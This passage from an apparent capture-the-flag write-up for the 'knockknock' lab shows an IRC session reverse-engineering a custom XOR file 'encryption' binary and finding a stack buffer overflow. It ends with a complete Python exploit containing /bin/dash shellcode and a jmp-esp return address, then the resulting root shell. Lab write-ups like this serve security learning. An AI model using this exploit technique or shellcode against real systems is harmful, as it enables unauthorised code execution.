</span><span class='line'>[2014-10-10T22:40:31+0100] &lt;c0ne&gt; signed or unsigned
</span><span class='line'>[2014-10-10T22:40:45+0100] &lt;c0ne&gt; ah signed value ranges from 0 till 80000000
</span><span class='line'>[2014-10-10T22:41:00+0100] &lt;c0ne&gt; where a unsigned ranges from 0 to ffffffff
</span><span class='line'>[2014-10-10T22:42:59+0100] &lt;recrudesce&gt; i&#39;m still trying to fathom out this xcrypt func
</span><span class='line'>[2014-10-10T22:43:06+0100] &lt;c0ne&gt; normally the code kinda tells you how the value was intended
</span><span class='line'>[2014-10-10T22:43:10+0100] &lt;recrudesce&gt; so it&#39;s taking file size, dividing by 4
</span><span class='line'>[2014-10-10T22:43:13+0100] &lt;recrudesce&gt; looping that many times
</span><span class='line'>[2014-10-10T22:43:30+0100] &lt;recrudesce&gt; *(_DWORD *)(a1 + 4 * i) = v3 ^ *(_DWORD *)(4 * i + a1);
</span><span class='line'>[2014-10-10T22:43:40+0100] &lt;recrudesce&gt; for ( j = 0; j &lt;= 7; ++j )
</span><span class='line'>[2014-10-10T22:43:49+0100] &lt;recrudesce&gt; {
</span><span class='line'>[2014-10-10T22:43:49+0100] &lt;recrudesce&gt;       if ( v3 &amp; 1 )
</span><span class='line'>[2014-10-10T22:43:49+0100] &lt;recrudesce&gt;         v3 = ((unsigned int)v3 &gt;&gt; 1) ^ 0x6DAA1CF4;
</span><span class='line'>[2014-10-10T22:43:49+0100] &lt;recrudesce&gt;       else
</span><span class='line'>[2014-10-10T22:43:49+0100] &lt;recrudesce&gt;         v3 = (unsigned int)v3 &gt;&gt; 1;
</span><span class='line'>[2014-10-10T22:43:49+0100] &lt;recrudesce&gt;     }
</span><span class='line'>[2014-10-10T22:43:49+0100] &lt;recrudesce&gt;   }
</span><span class='line'>[2014-10-10T22:44:02+0100] &lt;c0ne&gt; hmm dress up you ida abit more
</span><span class='line'>[2014-10-10T22:44:07+0100] &lt;c0ne&gt; for example
</span><span class='line'>[2014-10-10T22:44:21+0100] &lt;c0ne&gt; select a1 and press y
</span><span class='line'>[2014-10-10T22:44:25+0100] &lt;c0ne&gt; and change it to
</span><span class='line'>[2014-10-10T22:44:32+0100] &lt;c0ne&gt; _DWORD *a1
</span><span class='line'>[2014-10-10T22:44:40+0100] &lt;recrudesce&gt; hang on, i need to find a1
</span><span class='line'>[2014-10-10T22:44:53+0100] &lt;c0ne&gt; in the function params
</span><span class='line'>[2014-10-10T22:44:58+0100] &lt;c0ne&gt; int __cdecl xcrypt(_DWORD *a1, unsigned int a2)
</span><span class='line'>[2014-10-10T22:45:13+0100] &lt;recrudesce&gt; my pseudocode is in a file
</span><span class='line'>[2014-10-10T22:45:27+0100] &lt;c0ne&gt; aah that wont help then
</span><span class='line'>[2014-10-10T22:45:31+0100] &lt;recrudesce&gt; ok, now it&#39;s in ida
</span><span class='line'>[2014-10-10T22:45:35+0100] &lt;c0ne&gt; since the rest isnt changed then
</span><span class='line'>[2014-10-10T22:46:07+0100] &lt;recrudesce&gt; ok, so i did that
</span><span class='line'>[2014-10-10T22:46:32+0100] &lt;c0ne&gt; [23:43] &lt;recrudesce&gt; *(_DWORD *)(a1 + 4 * i) = v3 ^ *(_DWORD *)(4 * i + a1);
</span><span class='line'>[2014-10-10T22:46:38+0100] &lt;recrudesce&gt; now shows as a1[1] ^= v3
</span><span class='line'>[2014-10-10T22:46:39+0100] &lt;c0ne&gt; that looks abit better now i think?
</span><span class='line'>[2014-10-10T22:46:40+0100] &lt;c0ne&gt; yes
</span><span class='line'>[2014-10-10T22:46:46+0100] &lt;c0ne&gt; hmm
</span><span class='line'>[2014-10-10T22:46:57+0100] &lt;c0ne&gt; now shows as a1[1] ^= v3 that a 1? in the array?
</span><span class='line'>[2014-10-10T22:47:06+0100] &lt;recrudesce&gt; sorry, i
</span><span class='line'>[2014-10-10T22:47:11+0100] &lt;c0ne&gt; k
</span><span class='line'>[2014-10-10T22:47:12+0100] &lt;recrudesce&gt; a1[i]
</span><span class='line'>[2014-10-10T22:47:14+0100] &lt;c0ne&gt; i was worried
</span><span class='line'>[2014-10-10T22:47:31+0100] &lt;c0ne&gt; name that v3 key or so
</span><span class='line'>[2014-10-10T22:47:39+0100] &lt;c0ne&gt; select &gt; n ..
</span><span class='line'>[2014-10-10T22:48:03+0100] &lt;recrudesce&gt; name it to &quot;key&quot; ?
</span><span class='line'>[2014-10-10T22:48:11+0100] &lt;c0ne&gt; yeah or whatever
</span><span class='line'>[2014-10-10T22:48:16+0100] &lt;c0ne&gt; origenaly its called k
</span><span class='line'>[2014-10-10T22:48:16+0100] &lt;recrudesce&gt; ok, done
</span><span class='line'>[2014-10-10T22:48:28+0100] &lt;c0ne&gt; make its sometimes easier to read the whole thing
</span><span class='line'>[2014-10-10T22:48:53+0100] &lt;recrudesce&gt; k is already in use it seems
</span><span class='line'>[2014-10-10T22:49:10+0100] &lt;c0ne&gt; then use key :P
</span><span class='line'>[2014-10-10T22:49:15+0100] &lt;recrudesce&gt; yeah, done it
</span><span class='line'>[2014-10-10T22:49:53+0100] &lt;recrudesce&gt; {
</span><span class='line'>[2014-10-10T22:49:53+0100] &lt;recrudesce&gt;       if ( v3 &amp; 1 )
</span><span class='line'>[2014-10-10T22:49:53+0100] &lt;recrudesce&gt;         v3 = ((unsigned int)v3 &gt;&gt; 1) ^ 0x6DAA1CF4;
</span><span class='line'>[2014-10-10T22:49:53+0100] &lt;recrudesce&gt;       else
</span><span class='line'>[2014-10-10T22:49:53+0100] &lt;recrudesce&gt;         v3 = (unsigned int)v3 &gt;&gt; 1;
</span><span class='line'>[2014-10-10T22:49:53+0100] &lt;recrudesce&gt;     }
</span><span class='line'>[2014-10-10T22:49:53+0100] &lt;recrudesce&gt;   }
</span><span class='line'>[2014-10-10T22:49:59+0100] &lt;c0ne&gt; so with the last bit of code stripped
</span><span class='line'>[2014-10-10T22:50:05+0100] &lt;c0ne&gt; its kinda looks simple right?
</span><span class='line'>[2014-10-10T22:50:08+0100] &lt;recrudesce&gt; yup, that&#39;s what i have
</span><span class='line'>[2014-10-10T22:50:34+0100] &lt;c0ne&gt; so for every loop 0..7 it does a math check on the last key value
</span><span class='line'>[2014-10-10T22:50:37+0100] &lt;c0ne&gt; the and 1
</span><span class='line'>[2014-10-10T22:50:50+0100] &lt;c0ne&gt; and so chooses how the mutate the key
</span><span class='line'>[2014-10-10T22:51:28+0100] &lt;c0ne&gt; try porting this into python or what you like
</span><span class='line'>[2014-10-10T22:53:13+0100] &lt;recrudesce&gt; cant i just do this in C and make it echo the keys ?
</span><span class='line'>[2014-10-10T22:53:22+0100] &lt;c0ne&gt; sure
</span><span class='line'>[2014-10-10T22:53:26+0100] &lt;recrudesce&gt; rather than return 0, printf(key) ?
</span><span class='line'>[2014-10-10T22:53:38+0100] &lt;c0ne&gt; but python is just as easy
</span><span class='line'>[2014-10-10T22:53:45+0100] &lt;c0ne&gt; hmm now sure if you want that
</span><span class='line'>[2014-10-10T22:53:51+0100] &lt;c0ne&gt; but yes i think is possible
</span><span class='line'>[2014-10-10T22:54:02+0100] &lt;recrudesce&gt; ok, lets work this through in python
</span><span class='line'>[2014-10-10T22:54:03+0100] &lt;c0ne&gt; but you will flood your screen
</span><span class='line'>[2014-10-10T22:55:32+0100] &lt;recrudesce&gt; ok, so a1 is the content of the file
</span><span class='line'>[2014-10-10T22:55:37+0100] &lt;recrudesce&gt; and a2 is the length of the file ?
</span><span class='line'>[2014-10-10T22:55:38+0100] &lt;c0ne&gt; yes
</span><span class='line'>[2014-10-10T22:55:41+0100] &lt;c0ne&gt; yes
</span><span class='line'>[2014-10-10T22:56:56+0100] &lt;recrudesce&gt; ok, so i need to pass my python script a file
</span><span class='line'>[2014-10-10T22:57:01+0100] &lt;recrudesce&gt; get the contents of it
</span><span class='line'>[2014-10-10T22:57:04+0100] &lt;recrudesce&gt; and the length
</span><span class='line'>[2014-10-10T22:57:56+0100] &lt;c0ne&gt; thats a way indeed
</span><span class='line'>[2014-10-10T22:58:14+0100] &lt;c0ne&gt; easier is to generate the data youself
</span><span class='line'>[2014-10-10T22:58:25+0100] &lt;c0ne&gt; data = 5000 * &#39;A&#39;
</span><span class='line'>[2014-10-10T22:59:05+0100] &lt;recrudesce&gt; ok, so a1 = 5000 * &#39;A&#39;
</span><span class='line'>[2014-10-10T22:59:07+0100] &lt;recrudesce&gt; a2 = 5000
</span><span class='line'>[2014-10-10T22:59:19+0100] &lt;recrudesce&gt; key = -367349345
</span><span class='line'>[2014-10-10T22:59:41+0100] &lt;c0ne&gt; go for the signed
</span><span class='line'>[2014-10-10T22:59:47+0100] &lt;c0ne&gt;         key = ((unsigned int)key &gt;&gt; 1) ^ 0x6DAA1CF4;
</span><span class='line'>[2014-10-10T22:59:47+0100] &lt;c0ne&gt;       else
</span><span class='line'>[2014-10-10T22:59:47+0100] &lt;c0ne&gt;         key = (unsigned int)key &gt;&gt; 1;
</span><span class='line'>[2014-10-10T22:59:54+0100] &lt;c0ne&gt; sorry unsigned
</span><span class='line'>[2014-10-10T23:00:02+0100] &lt;c0ne&gt; the code tells you how its intended
</span><span class='line'>[2014-10-10T23:15:14+0100] &lt;recrudesce&gt; so i have
</span><span class='line'>[2014-10-10T23:15:22+0100] &lt;recrudesce&gt; key = 0xEA1AB19F
</span><span class='line'>[2014-10-10T23:15:35+0100] &lt;recrudesce&gt; for i in range (0,a2/4,1) :
</span><span class='line'>[2014-10-10T23:15:44+0100] &lt;recrudesce&gt;      print a1[i] ^ key
</span><span class='line'>[2014-10-10T23:15:48+0100] &lt;recrudesce&gt; throws an error
</span><span class='line'>[2014-10-10T23:15:56+0100] &lt;recrudesce&gt; TypeError: unsupported operand type(s) for ^: &#39;str&#39; and &#39;long&#39;
</span><span class='line'>[2014-10-10T23:15:57+0100] &lt;c0ne&gt; yeah of course
</span><span class='line'>[2014-10-10T23:16:02+0100] &lt;c0ne&gt; exactly
</span><span class='line'>[2014-10-10T23:16:02+0100] &lt;recrudesce&gt; so i guess i have to cast key as long ?
</span><span class='line'>[2014-10-10T23:16:07+0100] &lt;c0ne&gt; no
</span><span class='line'>[2014-10-10T23:16:20+0100] &lt;c0ne&gt; your data, you don&#39;t treat is a integer
</span><span class='line'>[2014-10-10T23:16:24+0100] &lt;recrudesce&gt; or cast my string as long ?
</span><span class='line'>[2014-10-10T23:16:26+0100] &lt;c0ne&gt; str xor integer
</span><span class='line'>[2014-10-10T23:16:50+0100] &lt;c0ne&gt; struct lib can help you
</span><span class='line'>[2014-10-10T23:17:02+0100] &lt;recrudesce&gt; so i need to work out how to convert my string to an int
</span><span class='line'>[2014-10-10T23:17:08+0100] &lt;recrudesce&gt; convert an A to an int :/
</span><span class='line'>[2014-10-10T23:17:42+0100] &lt;c0ne&gt; x = struct.unpack_from(&#39;&lt;L&#39;, a1, (i * 4))
</span><span class='line'>[2014-10-10T23:17:43+0100] &lt;c0ne&gt; or so
</span><span class='line'>[2014-10-10T23:17:47+0100] &lt;c0ne&gt; in the loop
</span><span class='line'>[2014-10-10T23:18:22+0100] &lt;recrudesce&gt; &lt;L ?
</span><span class='line'>[2014-10-10T23:18:46+0100] &lt;c0ne&gt; little endian indeed
</span><span class='line'>[2014-10-10T23:19:07+0100] &lt;recrudesce&gt; ok, so now i get tuple and long
</span><span class='line'>[2014-10-10T23:19:21+0100] &lt;c0ne&gt; sorry
</span><span class='line'>[2014-10-10T23:19:22+0100] &lt;recrudesce&gt; rather than string and long :P
</span><span class='line'>[2014-10-10T23:19:25+0100] &lt;c0ne&gt;  x = struct.unpack_from(&#39;&lt;L&#39;, a1, (i * 4))[0]
</span><span class='line'>[2014-10-10T23:19:27+0100] &lt;c0ne&gt; better
</span><span class='line'>[2014-10-10T23:19:50+0100] &lt;recrudesce&gt; ah ok
</span><span class='line'>[2014-10-10T23:19:52+0100] &lt;recrudesce&gt; cool
</span><span class='line'>[2014-10-10T23:20:06+0100] &lt;c0ne&gt; btw
</span><span class='line'>[2014-10-10T23:20:07+0100] &lt;c0ne&gt; for i in range (0,a2/4,1) :
</span><span class='line'>[2014-10-10T23:20:14+0100] &lt;c0ne&gt; how does this works?
</span><span class='line'>[2014-10-10T23:20:21+0100] &lt;recrudesce&gt; a2 is the length
</span><span class='line'>[2014-10-10T23:20:23+0100] &lt;recrudesce&gt; 0 is start
</span><span class='line'>[2014-10-10T23:20:26+0100] &lt;recrudesce&gt; 1 is step
</span><span class='line'>[2014-10-10T23:20:29+0100] &lt;c0ne&gt; aah ok
</span><span class='line'>[2014-10-10T23:20:34+0100] &lt;recrudesce&gt; so it&#39;ll step 1 from 0 to a2/4
</span><span class='line'>[2014-10-10T23:20:43+0100] &lt;c0ne&gt; which is the same as
</span><span class='line'>[2014-10-10T23:20:46+0100] &lt;recrudesce&gt; which is essentially what you&#39;re doing with v
</span><span class='line'>[2014-10-10T23:20:47+0100] &lt;recrudesce&gt;  for ( i = 0; a2 &gt;&gt; 2 &gt; i; ++i )
</span><span class='line'>[2014-10-10T23:20:52+0100] &lt;c0ne&gt; range(a2/4)
</span><span class='line'>[2014-10-10T23:20:58+0100] &lt;recrudesce&gt; yeah, could do that too
</span><span class='line'>[2014-10-10T23:21:04+0100] &lt;c0ne&gt; it confused me
</span><span class='line'>[2014-10-10T23:21:57+0100] &lt;recrudesce&gt; if ( key &amp; 1 )
</span><span class='line'>[2014-10-10T23:22:00+0100] &lt;recrudesce&gt; wossat doing ?
</span><span class='line'>[2014-10-10T23:22:22+0100] &lt;c0ne&gt; check a bit is true or false
</span><span class='line'>[2014-10-10T23:22:22+0100] &lt;recrudesce&gt; bitwise and
</span><span class='line'>[2014-10-10T23:23:33+0100] &lt;c0ne&gt; &gt;&gt;&gt; for i in range(10):
</span><span class='line'>[2014-10-10T23:23:34+0100] &lt;c0ne&gt; ...     print (i &amp; 1)
</span><span class='line'>[2014-10-10T23:23:34+0100] &lt;c0ne&gt; ...
</span><span class='line'>[2014-10-10T23:23:34+0100] &lt;c0ne&gt; 0
</span><span class='line'>[2014-10-10T23:23:34+0100] &lt;c0ne&gt; 1
</span><span class='line'>[2014-10-10T23:23:34+0100] &lt;c0ne&gt; 0
</span><span class='line'>[2014-10-10T23:23:34+0100] &lt;c0ne&gt; 1
</span><span class='line'>[2014-10-10T23:23:35+0100] &lt;c0ne&gt; 0
</span><span class='line'>[2014-10-10T23:23:35+0100] &lt;c0ne&gt; 1
</span><span class='line'>[2014-10-10T23:23:36+0100] &lt;c0ne&gt; 0
</span><span class='line'>[2014-10-10T23:23:36+0100] &lt;c0ne&gt; 1
</span><span class='line'>[2014-10-10T23:23:37+0100] &lt;c0ne&gt; 0
</span><span class='line'>[2014-10-10T23:23:37+0100] &lt;c0ne&gt; 1
</span><span class='line'>[2014-10-10T23:28:36+0100] &lt;c0ne&gt; now there where you do
</span><span class='line'>[2014-10-10T23:28:37+0100] &lt;c0ne&gt; print x ^ key
</span><span class='line'>[2014-10-10T23:28:59+0100] &lt;c0ne&gt; you could pack the result into a str again and append it to some output buffer
</span><span class='line'>[2014-10-10T23:29:17+0100] &lt;c0ne&gt; something like
</span><span class='line'>[2014-10-10T23:29:21+0100] &lt;c0ne&gt; outside the loop
</span><span class='line'>[2014-10-10T23:29:24+0100] &lt;c0ne&gt; r = &#39;&#39;
</span><span class='line'>[2014-10-10T23:29:50+0100] &lt;recrudesce&gt; outside which loop - the first or the 2nd ?
</span><span class='line'>[2014-10-10T23:29:52+0100] &lt;c0ne&gt; replace the print with r += struct.pack(&#39;&lt;L&#39;, (x ^ key))
</span><span class='line'>[2014-10-10T23:30:14+0100] &lt;c0ne&gt; out of the main loop
</span><span class='line'>[2014-10-10T23:30:23+0100] &lt;c0ne&gt; since you have the declare a clean buffer
</span><span class='line'>[2014-10-10T23:30:26+0100] &lt;c0ne&gt; empty
</span><span class='line'>[2014-10-10T23:31:10+0100] &lt;recrudesce&gt; ok, done
</span><span class='line'>[2014-10-10T23:31:18+0100] &lt;recrudesce&gt; then at the end, print r ?
</span><span class='line'>[2014-10-10T23:31:22+0100] &lt;recrudesce&gt; after the entire loop
</span><span class='line'>[2014-10-10T23:31:23+0100] &lt;c0ne&gt; yes
</span><span class='line'>[2014-10-10T23:31:27+0100] &lt;c0ne&gt; or!
</span><span class='line'>[2014-10-10T23:31:42+0100] &lt;c0ne&gt; open(&#39;myfile.tfc&#39;, &#39;wb&#39;).write( r )
</span><span class='line'>[2014-10-10T23:31:52+0100] &lt;c0ne&gt; so you have it in the file
</span><span class='line'>[2014-10-10T23:32:11+0100] &lt;c0ne&gt; you need it in a file anyways
</span><span class='line'>[2014-10-10T23:32:26+0100] &lt;recrudesce&gt; ok, i just encrypted 5000 A&#39;s
</span><span class='line'>[2014-10-10T23:32:36+0100] &lt;recrudesce&gt; and it looks like it did it
</span><span class='line'>[2014-10-10T23:33:00+0100] &lt;c0ne&gt; feed it to the binary
</span><span class='line'>[2014-10-10T23:33:06+0100] &lt;c0ne&gt; and see what happens
</span><span class='line'>[2014-10-10T23:33:21+0100] &lt;recrudesce&gt; seg fault
</span><span class='line'>[2014-10-10T23:33:32+0100] &lt;c0ne&gt; on..
</span><span class='line'>[2014-10-10T23:34:01+0100] &lt;recrudesce&gt; 0x4f04c41c
</span><span class='line'>[2014-10-10T23:34:14+0100] &lt;c0ne&gt; hmm
</span><span class='line'>[2014-10-10T23:34:21+0100] &lt;c0ne&gt; try 6000 A
</span><span class='line'>[2014-10-10T23:34:25+0100] &lt;c0ne&gt; for a test
</span><span class='line'>[2014-10-10T23:34:41+0100] &lt;c0ne&gt; the original buffer is 4096
</span><span class='line'>[2014-10-10T23:34:50+0100] &lt;c0ne&gt; now that very close to that 5000
</span><span class='line'>[2014-10-10T23:35:26+0100] &lt;c0ne&gt; ooh btw
</span><span class='line'>[2014-10-10T23:35:33+0100] &lt;c0ne&gt; i see a bug in your code
</span><span class='line'>[2014-10-10T23:35:42+0100] &lt;c0ne&gt; for ( j = 0; j &lt;= 7; ++j )
</span><span class='line'>[2014-10-10T23:35:48+0100] &lt;c0ne&gt; 0 ..7 is 8
</span><span class='line'>[2014-10-10T23:35:50+0100] &lt;c0ne&gt; rounds
</span><span class='line'>[2014-10-10T23:35:56+0100] &lt;c0ne&gt; for j in range(7):
</span><span class='line'>[2014-10-10T23:36:00+0100] &lt;c0ne&gt; this is 7 rounds
</span><span class='line'>[2014-10-10T23:36:29+0100] &lt;c0ne&gt; j &lt;= 7
</span><span class='line'>[2014-10-10T23:36:35+0100] &lt;c0ne&gt; less or equal
</span><span class='line'>[2014-10-10T23:36:47+0100] &lt;recrudesce&gt; but it starts at 0
</span><span class='line'>[2014-10-10T23:36:49+0100] &lt;c0ne&gt; if it did j &lt; 7 it would be 7 rounds
</span><span class='line'>[2014-10-10T23:37:07+0100] &lt;recrudesce&gt; so i need to do 6 then
</span><span class='line'>[2014-10-10T23:37:13+0100] &lt;c0ne&gt; no
</span><span class='line'>[2014-10-10T23:37:17+0100] &lt;c0ne&gt; 8
</span><span class='line'>[2014-10-10T23:37:23+0100] &lt;c0ne&gt; for j in range(8)
</span><span class='line'>[2014-10-10T23:37:36+0100] &lt;c0ne&gt; that will go from 0 .. up till 7
</span><span class='line'>[2014-10-10T23:37:40+0100] &lt;c0ne&gt; which is 8 rounds
</span><span class='line'>[2014-10-10T23:37:49+0100] &lt;c0ne&gt; since the 0 counts to
</span><span class='line'>[2014-10-10T23:38:09+0100] &lt;recrudesce&gt; segfault at 41414141
</span><span class='line'>[2014-10-10T23:38:09+0100] &lt;recrudesce&gt; nice
</span><span class='line'>[2014-10-10T23:38:25+0100] &lt;c0ne&gt; now from here on i made it easy
</span><span class='line'>[2014-10-10T23:38:30+0100] &lt;c0ne&gt; exec stack
</span><span class='line'>[2014-10-10T23:38:38+0100] &lt;c0ne&gt; and even added some little helper
</span><span class='line'>[2014-10-10T23:40:14+0100] &lt;recrudesce&gt; so it&#39;s one way encryption
</span><span class='line'>[2014-10-10T23:40:19+0100] &lt;recrudesce&gt; but you can encrypt encrypted files to decrypt
</span><span class='line'>[2014-10-10T23:40:23+0100] &lt;recrudesce&gt; hahaha
</span><span class='line'>[2014-10-10T23:40:26+0100] &lt;c0ne&gt; yes
</span><span class='line'>[2014-10-10T23:40:27+0100] &lt;c0ne&gt; xor
</span><span class='line'>[2014-10-10T23:40:36+0100] &lt;c0ne&gt; with a key mutation
</span><span class='line'>[2014-10-10T23:40:53+0100] &lt;c0ne&gt; if i used a static key of for example 16 bytes
</span><span class='line'>[2014-10-10T23:41:06+0100] &lt;c0ne&gt; you could see some pattern in the encrypted data
</span><span class='line'>[2014-10-10T23:41:14+0100] &lt;c0ne&gt; kinda revealing the key
</span><span class='line'>[2014-10-10T23:41:24+0100] &lt;c0ne&gt; so that why added a bit of math
</span><span class='line'>[2014-10-10T23:43:04+0100] &lt;c0ne&gt; you can also make it leak the key
</span><span class='line'>[2014-10-10T23:43:12+0100] &lt;c0ne&gt; feed it a file with 00 bytes
</span><span class='line'>[2014-10-10T23:45:34+0100] &lt;recrudesce&gt; eip is at 4124
</span><span class='line'>[2014-10-10T23:46:29+0100] &lt;c0ne&gt; yes
</span><span class='line'>[2014-10-10T23:48:06+0100] &lt;recrudesce&gt; ok, have control of EIP
</span><span class='line'>[2014-10-10T23:49:35+0100] &lt;c0ne&gt; now whats next ..
</span><span class='line'>[2014-10-10T23:50:04+0100] &lt;recrudesce&gt; ok, so ret2lib i guess ?
</span><span class='line'>[2014-10-10T23:50:13+0100] &lt;c0ne&gt; naah
</span><span class='line'>[2014-10-10T23:50:16+0100] &lt;c0ne&gt; even more simple
</span><span class='line'>[2014-10-10T23:50:29+0100] &lt;c0ne&gt; stack is executable
</span><span class='line'>[2014-10-10T23:50:38+0100] &lt;c0ne&gt; no need for fancy rops
</span><span class='line'>[2014-10-10T23:50:40+0100] &lt;recrudesce&gt; jump to esp
</span><span class='line'>[2014-10-10T23:50:46+0100] &lt;c0ne&gt; yeah
</span><span class='line'>[2014-10-10T23:52:15+0100] &lt;c0ne&gt; msfelfscan -j esp binaryfile
</span><span class='line'>[2014-10-10T23:53:55+0100] &lt;c0ne&gt; asm (&quot;jmp %esp&quot;);
</span><span class='line'>[2014-10-10T23:54:00+0100] &lt;c0ne&gt; added it on purpose
</span><span class='line'>[2014-10-10T23:54:06+0100] &lt;c0ne&gt; i&#39;m not that evil
</span><span class='line'>[2014-10-10T23:57:50+0100] &lt;c0ne&gt; since there isnt any more tricks down the way
</span></code></pre></td></tr></table></div></figure>


<p>So, now that you read that, this is what my Python script looks like</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/bin/python</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="c">#a1 = file contents</span>
</span><span class='line'><span class="c">#a2 = file length</span>
</span><span class='line'>
</span><span class='line'><span class="c">#f = open(&#39;input_buff.tfc&#39;, &#39;r&#39;)</span>
</span><span class='line'><span class="c">#a1 = f.read()</span>
</span><span class='line'><span class="c">#a2 = len(a1)</span>
</span><span class='line'>
</span><span class='line'><span class="n">ret</span> <span class="o">=</span> <span class="s">&#39;</span><span class="se">\x93\x8e\x04\x08</span><span class="s">&#39;</span> <span class="c">#08048d93</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">a1</span> <span class="o">=</span> <span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mi">4124</span> <span class="o">+</span> <span class="n">ret</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\x90</span><span class="s">&#39;</span> <span class="o">*</span> <span class="mi">10</span> <span class="o">+</span> <span class="n">shellcode</span>
</span><span class='line'><span class="n">l</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">a1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span>
</span><span class='line'><span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">l</span><span class="p">):</span>
</span><span class='line'>        <span class="n">a1</span> <span class="o">+=</span> <span class="s">&#39;Z&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="n">a2</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">a1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">key</span> <span class="o">=</span> <span class="mh">0xEA1AB19F</span>
</span><span class='line'><span class="n">r</span><span class="o">=</span><span class="s">&#39;&#39;</span>
</span><span class='line'><span class="c"># now do the first for loop</span>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">a2</span><span class="o">/</span><span class="mi">4</span><span class="p">):</span>
</span><span class='line'>        <span class="n">x</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack_from</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="p">(</span><span class="n">i</span> <span class="o">*</span> <span class="mi">4</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>        <span class="c">#print x ^ key</span>
</span><span class='line'>        <span class="n">r</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">x</span> <span class="o">^</span> <span class="n">key</span><span class="p">))</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
</span><span class='line'>                <span class="k">if</span> <span class="p">(</span><span class="n">key</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">):</span>
</span><span class='line'>                        <span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="n">key</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x6DAA1Cf4</span>
</span><span class='line'>                <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                        <span class="n">key</span> <span class="o">=</span> <span class="n">key</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span><span class='line'><span class="nb">open</span><span class="p">(</span><span class="s">&#39;myfile.tfc&#39;</span><span class="p">,</span> <span class="s">&#39;wb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span> <span class="n">r</span> <span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>This generates a .tfc file, which when provided to the tfc application &ldquo;decrypts&rdquo;, jumps to esp and executes the shellcode, dropping us to a shell.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>jason@knockknock:~<span class="nv">$ </span>python keyshow.py
</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>./tfc ./myfile.tfc ./myfile_blah.tfc
</span><span class='line'><span class="c"># id</span>
